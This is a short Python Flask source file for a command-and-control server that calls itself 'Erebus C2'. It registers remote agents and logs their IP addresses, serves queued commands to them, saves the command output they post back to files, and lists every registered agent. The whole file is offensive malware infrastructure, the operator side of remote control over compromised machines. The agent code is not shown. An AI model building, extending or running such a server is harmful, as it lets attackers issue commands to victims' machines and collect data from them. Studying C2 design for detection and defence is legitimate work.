from flask import Flask
import random
from flask import Flask, request
import shared
from flask import jsonify

app = Flask(__name__)

agents = {}

def randomuuid():
    int1 = random.randint(1000, 9999)
    int2 = random.randint(1000, 9999)
    int3 = random.randint(1000, 9999)
    int4 = random.randint(1000, 9999)
    int_random = str(int1) + "-" + str(int2) + "-" + str(int3) + "-" + str(int4)
    return int_random

@app.route("/")
def index():
    return "Erebus C2 is Online !"

@app.route("/agent/register")
def register():
    guid = randomuuid()
    agents[guid] = {
        "id": guid,
        "ip": request.remote_addr }
    return guid

@app.route("/agent/<agent_guid>")
def agent(agent_guid):
    if agent_guid not in agents:
        return "No such agent"
    else: return "Agent is registered"

@app.route("/agent/<agent_guid>/command")
def command(agent_guid):

    cmd = shared.read_command()

    if agent_guid not in agents:
        return "No such agent"
    elif cmd  == None:
        return "No command set"
    else:
        shared.delete_command()
        return cmd
@app.route("/agent/<agent_guid>/output", methods=["POST"])
def output(agent_guid):
    if agent_guid not in agents:
        return "No such agent"
    else:
        data = request.get_json()

        with open(f"results_{agent_guid}.txt", "a") as f:
            f.write(data["output"] + "\n")

        return "OK"


@app.route("/agent/list")
def list_agents():
    return jsonify(agents)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
